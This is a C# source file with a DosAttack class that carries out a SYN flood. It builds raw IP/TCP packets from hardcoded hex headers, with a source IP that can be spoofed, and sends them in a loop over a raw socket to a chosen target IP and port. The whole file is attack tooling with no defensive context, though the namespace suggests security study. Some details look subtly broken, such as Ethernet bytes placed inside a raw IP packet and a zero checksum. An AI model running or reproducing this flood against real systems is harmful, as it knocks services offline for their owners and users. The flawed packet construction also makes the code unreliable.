using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices.JavaScript;

namespace LD.InfoSec.Network.DoS;

public class DosAttack(AttackOptions options)
{
    public async Task Start()
    {
        if (options.DosType == DosType.SynFlood)
        {
            await StartSynFlood();    
        }
    }

    private async Task StartSynFlood()
    {
        using Socket socket = new(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.Raw);
        IPAddress sourceIpAddress = IPAddress.Parse(options.SourceIp);
        IPAddress targetIpAddress = IPAddress.Parse(options.TargetIp);
        IPEndPoint ipEndPoint = new(targetIpAddress, options.TargetPort);
        
        byte[] packetBytes = GetRawIpWrapper(sourceIpAddress, targetIpAddress);
        
        for (int index = 0; index < options.Size; index++)
        {
            await socket.SendToAsync(new ArraySegment<byte>(packetBytes), ipEndPoint);
        }
    }

    private byte[] GetRawIpWrapper(IPAddress sourceIpAddress, IPAddress targetIpAddress)
    {
        byte[] ethernetBytes = ConvertHexToByteArray("00155d04f80700155dca2d2b0800");
        byte[] ipHeaderBytes = ConvertHexToByteArray("4500002c2680000034067ecc");
        byte[] sourceIpBytes = sourceIpAddress.GetAddressBytes();
        byte[] targetIpBytes = targetIpAddress.GetAddressBytes();
        
        byte[] tcpSynPacketBytes = GetTcpSynPacketBytes();
        byte[] packetBytes = new byte[ipHeaderBytes.Length + tcpSynPacketBytes.Length + sourceIpBytes.Length + targetIpBytes.Length + ethernetBytes.Length];
        ethernetBytes.CopyTo(packetBytes, 0);
        ipHeaderBytes.CopyTo(packetBytes, ethernetBytes.Length);
        sourceIpBytes.CopyTo(packetBytes, ipHeaderBytes.Length + ethernetBytes.Length);
        targetIpBytes.CopyTo(packetBytes, ipHeaderBytes.Length + sourceIpBytes.Length + ethernetBytes.Length);
        tcpSynPacketBytes.CopyTo(packetBytes, ipHeaderBytes.Length + sourceIpBytes.Length + targetIpBytes.Length + ethernetBytes.Length);
        return packetBytes;
    }

    static byte[] ConvertHexToByteArray(string hexString)
    {
        int length = hexString.Length;
        byte[] byteArray = new byte[length / 2];

        for (int i = 0; i < length; i += 2)
        {
            byteArray[i / 2] = (byte)((GetHexValue(hexString[i]) << 4) | GetHexValue(hexString[i + 1]));
        }

        return byteArray;
    }
    
    static int GetHexValue(char hexDigit)
    {
        int value = hexDigit - '0';
        return value > 9 ? value - 7 : value;
    }

    private byte[] GetTcpSynPacketBytes()
    {
        MemoryStream stream = new();
        
        byte[] sourcePortBytes = BitConverter.GetBytes(options.SourcePort);
        Array.Reverse(sourcePortBytes);
        stream.Write(sourcePortBytes, 0, 2);
        
        byte[] targetPortBytes = BitConverter.GetBytes(options.TargetPort);
        Array.Reverse(targetPortBytes);
        stream.Write(targetPortBytes, 0, 2);
        
        var sequenceNumberBytes = BitConverter.GetBytes((uint)0);
        Array.Reverse(sequenceNumberBytes);
        stream.Write(sequenceNumberBytes, 0, 4);
        
        var acknowledgmentNumberBytes = BitConverter.GetBytes((uint)0);
        Array.Reverse(acknowledgmentNumberBytes);
        stream.Write(acknowledgmentNumberBytes, 0, 4);
        
        var dataOffsetAndFlagsBytes = BitConverter.GetBytes((ushort)2);
        Array.Reverse(dataOffsetAndFlagsBytes);
        stream.Write(dataOffsetAndFlagsBytes, 0, 2);
        
        var windowSizeBytes = BitConverter.GetBytes((ushort)1024);
        Array.Reverse(windowSizeBytes);
        stream.Write(windowSizeBytes, 0, 2);
        
        var checksumBytes = BitConverter.GetBytes((ushort)0);
        Array.Reverse(checksumBytes);
        stream.Write(checksumBytes, 0, 2);
        
        var urgentPointerBytes = BitConverter.GetBytes((ushort)0);
        Array.Reverse(urgentPointerBytes);
        stream.Write(urgentPointerBytes, 0, 2);
        
        var optionsBytes = BitConverter.GetBytes((uint)0);
        Array.Reverse(optionsBytes);
        stream.Write(optionsBytes, 0, 4);
        
        return stream.ToArray();
    }
}
